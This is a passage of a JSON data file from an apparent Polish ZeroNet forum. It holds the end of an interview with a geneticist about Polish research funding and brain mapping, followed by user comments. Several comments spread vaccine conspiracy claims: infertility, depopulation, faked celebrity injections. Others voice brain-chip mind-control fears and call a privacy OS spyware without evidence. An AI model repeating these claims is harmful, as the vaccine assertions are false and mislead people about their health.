na świat, na ile to wtedy było możliwe. Powiem może niepopularnie: uważam, że obecnie jest super. Nigdy nie było takich możliwości – finansowych, komunikacyjnych itp.\nObserwuję jednak moich współpracowników i sadzę, że dopiero obecni doktoranci są pokoleniem, które jest całkowicie kompatybilne ze światem. Nie mają kompleksów, znają języki, są równorzędnymi partnerami dla swojego pokolenia na Zachodzie. Nie chodzi mi o to, że „teraz trzeba stawiać tylko na młodzież”. Oni oczywiście stawiają swoje pierwsze kroki na fundamencie, którzy stworzyliśmy my, starsi i tego nie można nie doceniać. Ale to, że żyją w zupełnie innej rzeczywistości niejako od początku – jest wielkim atutem.\nMamy w Polsce wieloletnie zapóźnienia, ale to się zmienia i to jest wspaniałe. Zawsze w naukach przyrodniczych potrzeba pieniędzy – bo kosztują odczynniki, aparatura, zwierzęta. I pieniędzy mogłoby być więcej – bo obecnie choć zdecydowanie uważam, że mamy więcej pieniędzy w nauce niż mieliśmy wcześniej, ale i nasi koledzy na Zachodzie też mają ich więcej niż mieli, co oznacza, że mają dużo więcej niż my, więc wciąż uciekają, są szybsi, wydajniejsi. Zawsze mówię jednak moim współpracownikom: „choćby w ostatnim wagonie pędzącego pociągu, ale jedziemy”.\nFatalne dla nauki jest to, że podlegamy np. ustawie o zamówieniach publicznych, musimy wszystko kupować „przez przetargi”, gdzie często decyduje cena – co w ogóle jest fatalne, a dodatkowo procedury są długie, a to bardzo spowalnia proces „robienia nauki”. To bym absolutnie zmieniła! Zdobywamy pieniądze na badania w różnych konkursach, wypadałoby zaufać, że jak już je mamy to będziemy je wydatkować według najlepszej wiedzy.\nPani zdaniem, jakie osiągnięcie popchnęłyby wyraźnie genetykę do przodu, byłyby dla ludzkości przełomowe?\nZdecydowanie poznanie mózgu człowieka w takim stopniu jak nicienia byłoby fenomenalnym osiągnięciem. Wyzwaniem jest tu wspomniana już konektomika. W USA pracuje się nad stworzeniem mapy mózgu w stylu Google Map.\nMózg w przeciwieństwie do np. wątroby czy serca da się modelować, badać . Mózg nie tylko składa się z miliardów komórek, neuronów oraz komórek glejowych (astrocytów, oligodendrocytów i mikrogleju), ale ma bardzo złożoną budowę. Składa się z rozmaitych struktur: kory mózgowej, prążkowia, hipokampa, jadra migdałowatego, istoty czarnej, uzdeczki, wzgórza, podwzgórza itp. Każda z tych struktur mózgowych ma określoną budowę, neurony budujące te struktury są nieco inne, łączą się ze sobą i wzajemnie na siebie wpływają – poznanie tych wzajemnych relacji dokładnie, stworzenie dokładnej mapy połączeń – to byłoby coś!",
			"added": 1621633948
		}
	],
	"topic_vote": {
		"1606360383_18yZKKFySP5bvmNy14T9vgj3H99AC1PQkH": 1,
		"1618090451_1Mk2CjDdAFEuyDqvhok2oG9HWpijubU5eg": 1,
		"1618429064_1GggQzyJGUJQsTbYSHbjXi6YD98uzbVU2b": 1,
		"1618538921_1GggQzyJGUJQsTbYSHbjXi6YD98uzbVU2b": 1,
		"1621391720_1GggQzyJGUJQsTbYSHbjXi6YD98uzbVU2b": 1,
		"1620994683_18yZKKFySP5bvmNy14T9vgj3H99AC1PQkH": 1,
		"1621556211_1GggQzyJGUJQsTbYSHbjXi6YD98uzbVU2b": 1,
		"1621633955_1GggQzyJGUJQsTbYSHbjXi6YD98uzbVU2b": 1
	},
	"next_comment_id": 9,
	"comment": {
		"1606360383_18yZKKFySP5bvmNy14T9vgj3H99AC1PQkH": [
			{
				"comment_id": 1,
				"body": "Zgadzam się w 100%. Dodam też od siebie że chodzi im o zmniejszenie ilości ludzi, szczepionki które będą powodować bezpłodność są ich BRONIĄ przeciwko nam. W TV można usłyszeć że gdy ileś tam % ludzi zostanie zaszczepione to covid magicznie zniknie. Ale prawda jest taka że co rusz to jakieś inne odmiany covida się pojawiają. Więc o powrocie do normalnego życia można zapomnieć, będzie coraz gorzej, mam znajomych co byli zdrowi a po zaszczepieniu się szczepionką Pfizera (za którą stoi Bill Gates czyli człowiek który mówił że jest przeludnienie na ziemi) straszenie zachorowali, coś co powinno nas chronić będzie nas zabijać.\n\nDla sceptycznych mam pewną rozkmine: Zobaczcie w TV na nagrania gdy są szczepieni politycy i gwiazdy, czemu nigdy nie widać jak igła się w nich wbija?? A gdy zwykłego szaraka szczepią to dokładnie widać proces szczepienia.",
				"added": 1618085592
			}
		],
		"1618090451_1Mk2CjDdAFEuyDqvhok2oG9HWpijubU5eg": [
			{
				"comment_id": 2,
				"body": "Warto wspomnieć o Kodachi że to FAKE broniący prywatności OS który ma wbudowanego VPNa i DNSa czyli typowy system który będzie nas szpiegować.\n\nLink: [ ! ]   Uwaga nie pobierać    -------->    https://www.digi77.com/linux-kodachi/",
				"added": 1618093754
			},
			{
				"comment_id": 4,
				"body": "> [cddd43hk](#comment_4_17tqEvyx1QiwVo6nbBe9F6UtWcPRzRUavU): Jesteś kłamca - spiskowiec . Dowody , konkrety , fakty . Po pierwsze przeczytaj dokladnie 7 razy do czego jest Kodachi , jak go uzywac i gdzie . Chyba ze napisałes tak z przekory , podajac ten link , ale wtedy moze to byc odebrane przez czytajacych odwrotnie od twoich intencji . Kodachi towarzyszy mi od poczatku , system wymagajacy duzej wiedzy unixowej , terminal jest tam podstawa a instalowanie go w pc jako system wiodacy to szkolny bładWiedza kosztuje , dlatego tylko tyle o Kodachi . Pozdrowionka\n\nHahaha dobre \"Kodachi towarzyszy mi od poczatku\" dawno się tak nie uśmiałem.",
				"added": 1618428008
			}
		],
		"1618103384_18yZKKFySP5bvmNy14T9vgj3H99AC1PQkH": [
			{
				"comment_id": 3,
				"body": "\"Bezpieczne systemy operacyjne? Jaki to ma sens? Z niemożliwości spełnienia dalszych warunków.\"\n\nI tak lepiej mieć taki system niż windowsa który daje nam gwarancje że będzie nas szpiegować, każdy krok w strone ochrony życia prywatnego jest dobry.",
				"added": 1618156961
			}
		],
		"1618579412_1GggQzyJGUJQsTbYSHbjXi6YD98uzbVU2b": [
			{
				"comment_id": 5,
				"body": "> [tomasz2](#comment_9_1MUXpeXL4m6WZ6JDgCUfSvQerJopfLxCM6): Richard Stallman\n\nSą to słowa Richarda Stallmana, może i przesadził mieszając do tego Stalina? Jednak jeśli chodzi o oprogramowanie \"SRAJFONA\" to nie można się z nim nie zgodzić, jest to oprogramowanie godne Wielkiego Brata.\n\nNie wiem czy słyszałeś jaka była pare lat temu afera że w Iphonie nawet po wyłączeniu bluetooth nadal pozostawał włączony tyle że inne telefony tego nie widziały, ale sklepowe czujniki wykrywały że jest włączony.\n\nMyśle jednak że Stallman celowo powiedział takie coś aby zrobić szum. Nie od dziś wiemy że takie bzdety przyciągają MEDIA, czy tytuł jest aż taki ważny? Skoro wiemy o co mu chodziło?",
				"added": 1618606102
			}
		],
		"1614897242_181pxua95EmDYcDgDUZ7r7QGr2ti6VKtMa": [
			{
				"comment_id": 6,
				"body": "awruk ta lista jest zbędna, wiadomo że wykop to jest syf i nie warto tam włazić. Chyba większość Zeronetowiczy się ze mną zgodzi.",
				"added": 1621097185
			}
		],
		"1621633955_1GggQzyJGUJQsTbYSHbjXi6YD98uzbVU2b": [
			{
				"comment_id": 7,
				"body": "Co jeśli połączą to z Neuralink N1 od Elon Muska? Czy będą mogli sterować ludzmi tak jak tą myszą? Obecnie jest nagonka na szczepionki ( nie szczepisz się = problemy z wyjazdem za granice),... Teraz, pomyślcie co jeśli w przyszłości będzie tak że: nie pozwolisz wszczepić sobie czipa w mózg? To jesteś mniej wydajny więc nie dostaniesz pracy, a jeśli pozwolisz to oddajesz im swoje życie i prywatność? Koszmarna wizja, a ludzie jak zawykle obudzą się gdy już będzie po wszystkim, o ile się obudzą ...",
				"added": 1621634534
			}
		],
		"1621556211_1GggQzyJGUJQsTbYSHbjXi6YD98uzbVU2b": [
			{
				"comment_id": 8,
				"body": "Skoro da się kontrolować tym czipem komputer po przez WiFi to czemu miało by się nie dać odwrotnie? Komputer miał by władze nad naszym mózgiem, pomyślisz o obaleniu dyktatury to zostanie to zarejestrowane i przesłane do bazy danych po czym idzesz siedzeć za samą \"MYŚL\"? Czy ludzie w przyszłości będą walczyć o wolność myśli? Obym się mylił, ...",
				"added": 1621635019
			}
		]
	},
	"comment_vote": {
		"256_18yZKKFySP5bvmNy14T9vgj3H99AC1PQkH": 1,
		"1_1GggQzyJGUJQsTbYSHbjXi6YD98uzbVU2b": 1,
		"2_1GggQzyJGUJQsTbYSHbjXi6YD98uzbVU2b": 1,
		"6_1MUXpeXL4m6WZ6JDgCUfSvQerJopfLxCM6": 1,
		"273_18yZKKFySP5bvmNy14T9vgj3H99AC1PQkH": 1,
		"61_1MWEiuQMdpFnEMLrRLSxEPJYB55u76WTjY": 1,
		"8_1MUXpeXL4m6WZ6JDgCUfSvQerJopfLxCM6": 1,
		"274_18yZKKFySP5bvmNy14T9vgj3H99AC1PQkH": 1,
		"284_18yZKKFySP5bvmNy14T9vgj3H99AC1PQkH": 1,
		"73_1MWEiuQMdpFnEMLrRLSxEPJYB55u76WTjY": 1,
		"1_1ANTSxbg7dbwM36JUsRuRiZYGVYz3JCrda": 1,
		"2_1ANTSxbg7dbwM36JUsRuRiZYGVYz3JCrda": 1,
		"285_18yZKKFySP5bvmNy14T9vgj3H99AC1PQkH": 1,
		"22_1MUXpeXL4m6WZ6JDgCUfSvQerJopfLxCM6": 1
	}
}